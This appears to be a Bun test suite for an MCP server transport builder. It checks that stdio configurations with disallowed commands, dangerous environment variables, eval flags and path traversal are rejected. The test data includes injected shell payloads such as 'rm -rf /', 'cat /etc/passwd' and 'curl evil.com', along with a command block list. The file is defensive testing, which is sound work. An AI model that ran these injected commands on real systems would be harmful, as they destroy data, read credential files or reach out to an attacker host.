import { describe, expect, mock, test } from 'bun:test';

mock.module('../../db', () => ({
  getDb: () => ({}),
}));

import { buildTransport, type MCPServerConfig } from '../config';

describe('buildTransport', () => {
  test('builds SSE transport from config', () => {
    const config: MCPServerConfig = {
      id: 'mcp-1',
      serverName: 'test',
      transportType: 'sse',
      serverUrl: 'https://mcp.example.com/sse',
      enabled: true,
      channelId: null,
      command: null,
      args: null,
      env: null,
      cwd: null,
    };
    const transport = buildTransport(config) as { type: string; url: string };
    expect(transport.type).toBe('sse');
    expect(transport.url).toBe('https://mcp.example.com/sse');
  });

  test('builds HTTP transport with headers', () => {
    const config: MCPServerConfig = {
      id: 'mcp-2',
      serverName: 'test',
      transportType: 'http',
      serverUrl: 'https://mcp.example.com',
      headers: { Authorization: 'Bearer token' },
      enabled: true,
      channelId: null,
      command: null,
      args: null,
      env: null,
      cwd: null,
    };
    const transport = buildTransport(config) as {
      type: string;
      url: string;
      headers?: Record<string, string>;
    };
    expect(transport.type).toBe('http');
    expect(transport.headers?.Authorization).toBe('Bearer token');
  });

  test('throws when SSE config has no serverUrl', () => {
    const config: MCPServerConfig = {
      id: 'mcp-3',
      serverName: 'test',
      transportType: 'sse',
      serverUrl: null,
      enabled: true,
      channelId: null,
      command: null,
      args: null,
      env: null,
      cwd: null,
    };
    expect(() => buildTransport(config)).toThrow('no serverUrl');
  });

  test('throws when stdio config has no command', () => {
    const config: MCPServerConfig = {
      id: 'mcp-4',
      serverName: 'test',
      transportType: 'stdio',
      serverUrl: null,
      enabled: true,
      channelId: null,
      command: null,
      args: null,
      env: null,
      cwd: null,
    };
    expect(() => buildTransport(config)).toThrow('no command');
  });

  test('builds stdio transport with allowed command and args', () => {
    const config: MCPServerConfig = {
      id: 'mcp-5',
      serverName: 'test',
      transportType: 'stdio',
      serverUrl: null,
      enabled: true,
      channelId: null,
      command: 'npx',
      args: ['-y', '@mcp/server'],
      env: null,
      cwd: null,
    };
    const transport = buildTransport(config);
    expect(transport).toBeDefined();
  });

  // --- Security tests (issue #5) ---

  describe('rejects disallowed commands', () => {
    const disallowed = ['bash', 'sh', 'curl', 'rm', 'cat', 'wget', '/bin/bash', 'python'];

    for (const cmd of disallowed) {
      test(`rejects command: "${cmd}"`, () => {
        const config: MCPServerConfig = {
          id: 'sec-1',
          serverName: 'evil',
          transportType: 'stdio',
          serverUrl: null,
          enabled: true,
          channelId: null,
          command: cmd,
          args: null,
          env: null,
          cwd: null,
        };
        expect(() => buildTransport(config)).toThrow('rejected by security policy');
      });
    }
  });

  describe('allows permitted commands', () => {
    const allowed = ['npx', 'node', 'uvx', 'python3', 'deno', 'bun'];

    for (const cmd of allowed) {
      test(`allows command: "${cmd}"`, () => {
        const config: MCPServerConfig = {
          id: 'sec-2',
          serverName: 'ok',
          transportType: 'stdio',
          serverUrl: null,
          enabled: true,
          channelId: null,
          command: cmd,
          args: null,
          env: null,
          cwd: null,
        };
        // Should not throw (StdioMCPTransport is constructed)
        expect(() => buildTransport(config)).not.toThrow();
      });
    }
  });

  describe('rejects dangerous env keys', () => {
    const dangerousKeys = [
      'LD_PRELOAD',
      'NODE_OPTIONS',
      'PATH',
      'DYLD_INSERT_LIBRARIES',
      'BASH_ENV',
    ];

    for (const key of dangerousKeys) {
      test(`rejects env key: "${key}"`, () => {
        const config: MCPServerConfig = {
          id: 'sec-3',
          serverName: 'evil-env',
          transportType: 'stdio',
          serverUrl: null,
          enabled: true,
          channelId: null,
          command: 'npx',
          args: null,
          env: { [key]: '/tmp/evil' },
          cwd: null,
        };
        expect(() => buildTransport(config)).toThrow('rejected by security policy');
      });
    }

    test('rejects env key case-insensitively', () => {
      const config: MCPServerConfig = {
        id: 'sec-3b',
        serverName: 'evil-env-case',
        transportType: 'stdio',
        serverUrl: null,
        enabled: true,
        channelId: null,
        command: 'npx',
        args: null,
        env: { ld_preload: '/tmp/evil.so' },
        cwd: null,
      };
      expect(() => buildTransport(config)).toThrow('rejected by security policy');
    });

    test('allows safe env vars', () => {
      const config: MCPServerConfig = {
        id: 'sec-3c',
        serverName: 'safe-env',
        transportType: 'stdio',
        serverUrl: null,
        enabled: true,
        channelId: null,
        command: 'npx',
        args: null,
        env: { MCP_API_KEY: 'secret123', DEBUG: 'true' },
        cwd: null,
      };
      expect(() => buildTransport(config)).not.toThrow();
    });
  });

  describe('rejects shell metacharacters in args', () => {
    const maliciousArgs = [
      ['--flag; rm -rf /'],
      ['valid', '| cat /etc/passwd'],
      ['&& curl evil.com'],
      ['$(whoami)'],
      ['${IFS}'],
      ['`id`'],
      ['> /etc/passwd'],
      ['< /etc/shadow'],
      ['line1\nline2'],
      ['null\0byte'],
    ];

    for (const args of maliciousArgs) {
      test(`rejects args: ${JSON.stringify(args)}`, () => {
        const config: MCPServerConfig = {
          id: 'sec-4',
          serverName: 'evil-args',
          transportType: 'stdio',
          serverUrl: null,
          enabled: true,
          channelId: null,
          command: 'npx',
          args,
          env: null,
          cwd: null,
        };
        expect(() => buildTransport(config)).toThrow('rejected by security policy');
      });
    }

    test('allows safe args', () => {
      const config: MCPServerConfig = {
        id: 'sec-4b',
        serverName: 'safe-args',
        transportType: 'stdio',
        serverUrl: null,
        enabled: true,
        channelId: null,
        command: 'npx',
        args: ['-y', '@modelcontextprotocol/server-filesystem', '/home/user/projects'],
        env: null,
        cwd: null,
      };
      expect(() => buildTransport(config)).not.toThrow();
    });
  });

  describe('rejects eval/exec flags in args', () => {
    const evalFlags = ['-e', '--eval', '-p', '--print', '-c'];

    for (const flag of evalFlags) {
      test(`rejects eval flag: ${flag}`, () => {
        const config: MCPServerConfig = {
          id: 'sec-eval',
          serverName: 'eval-attack',
          transportType: 'stdio',
          serverUrl: null,
          enabled: true,
          channelId: null,
          command: 'node',
          args: [flag, 'process.exit(1)'],
          env: null,
          cwd: null,
        };
        expect(() => buildTransport(config)).toThrow('rejected by security policy');
      });
    }

    const evalBypasses: { label: string; args: string[] }[] = [
      { label: '--eval=code', args: ['--eval=process.exit(1)'] },
      { label: '-ecode (concatenated)', args: ['-eprocess.exit(1)'] },
      { label: '--print=expr', args: ['--print=process.env'] },
      { label: '-p"expr" (concatenated)', args: ['-p"process.env"'] },
      { label: 'positional eval subcommand', args: ['eval', 'Deno.exit(1)'] },
    ];

    for (const { label, args } of evalBypasses) {
      test(`rejects eval bypass: ${label}`, () => {
        const config: MCPServerConfig = {
          id: 'sec-eval-bypass',
          serverName: 'eval-bypass',
          transportType: 'stdio',
          serverUrl: null,
          enabled: true,
          channelId: null,
          command: 'node',
          args,
          env: null,
          cwd: null,
        };
        expect(() => buildTransport(config)).toThrow('rejected by security policy');
      });
    }
  });

  describe('rejects malformed env/cwd types from DB', () => {
    test('rejects env that is an array', () => {
      const config = {
        id: 'sec-env-arr',
        serverName: 'bad-env-type',
        transportType: 'stdio' as const,
        serverUrl: null,
        enabled: true,
        channelId: null,
        command: 'npx',
        args: null,
        env: ['not', 'an', 'object'] as unknown as Record<string, string>,
        cwd: null,
      };
      expect(() => buildTransport(config)).toThrow('rejected by security policy');
    });

    test('rejects cwd that is not a string', () => {
      const config = {
        id: 'sec-cwd-type',
        serverName: 'bad-cwd-type',
        transportType: 'stdio' as const,
        serverUrl: null,
        enabled: true,
        channelId: null,
        command: 'npx',
        args: null,
        env: null,
        cwd: 42 as unknown as string,
      };
      expect(() => buildTransport(config)).toThrow('rejected by security policy');
    });
  });

  describe('rejects path traversal in cwd', () => {
    const traversalPaths = [
      '../etc/passwd',
      '/home/user/../../etc',
      'projects/../../../root',
      '..',
      'a/b/../../../c',
    ];

    for (const cwd of traversalPaths) {
      test(`rejects cwd: "${cwd}"`, () => {
        const config: MCPServerConfig = {
          id: 'sec-5',
          serverName: 'evil-cwd',
          transportType: 'stdio',
          serverUrl: null,
          enabled: true,
          channelId: null,
          command: 'npx',
          args: null,
          env: null,
          cwd,
        };
        expect(() => buildTransport(config)).toThrow('rejected by security policy');
      });
    }

    test('allows safe absolute cwd', () => {
      const config: MCPServerConfig = {
        id: 'sec-5b',
        serverName: 'safe-cwd',
        transportType: 'stdio',
        serverUrl: null,
        enabled: true,
        channelId: null,
        command: 'npx',
        args: null,
        env: null,
        cwd: '/home/user/mcp-servers',
      };
      expect(() => buildTransport(config)).not.toThrow();
    });
  });

  describe('rejects args exceeding count/length limits', () => {
    test('rejects more than 20 args', () => {
      const config: MCPServerConfig = {
        id: 'sec-6a',
        serverName: 'too-many-args',
        transportType: 'stdio',
        serverUrl: null,
        enabled: true,
        channelId: null,
        command: 'npx',
        args: Array.from({ length: 21 }, (_, i) => `arg${i}`),
        env: null,
        cwd: null,
      };
      expect(() => buildTransport(config)).toThrow('rejected by security policy');
    });

    test('rejects arg exceeding 1000 chars', () => {
      const config: MCPServerConfig = {
        id: 'sec-6b',
        serverName: 'long-arg',
        transportType: 'stdio',
        serverUrl: null,
        enabled: true,
        channelId: null,
        command: 'npx',
        args: ['a'.repeat(1001)],
        env: null,
        cwd: null,
      };
      expect(() => buildTransport(config)).toThrow('rejected by security policy');
    });
  });

  describe('rejects cwd exceeding length limit', () => {
    test('rejects cwd exceeding 500 chars', () => {
      const config: MCPServerConfig = {
        id: 'sec-7',
        serverName: 'long-cwd',
        transportType: 'stdio',
        serverUrl: null,
        enabled: true,
        channelId: null,
        command: 'npx',
        args: null,
        env: null,
        cwd: '/a'.repeat(251),
      };
      expect(() => buildTransport(config)).toThrow('rejected by security policy');
    });
  });

  describe('rejects malformed args from DB', () => {
    test('rejects args containing non-string elements', () => {
      const config = {
        id: 'sec-8',
        serverName: 'bad-db-args',
        transportType: 'stdio' as const,
        serverUrl: null,
        enabled: true,
        channelId: null,
        command: 'npx',
        args: [123, { cmd: 'evil' }] as unknown as string[],
        env: null,
        cwd: null,
      };
      expect(() => buildTransport(config)).toThrow('rejected by security policy');
    });

    test('rejects args that is not an array', () => {
      const config = {
        id: 'sec-9',
        serverName: 'bad-db-args-obj',
        transportType: 'stdio' as const,
        serverUrl: null,
        enabled: true,
        channelId: null,
        command: 'npx',
        args: 'not-an-array' as unknown as string[],
        env: null,
        cwd: null,
      };
      expect(() => buildTransport(config)).toThrow('rejected by security policy');
    });
  });
});
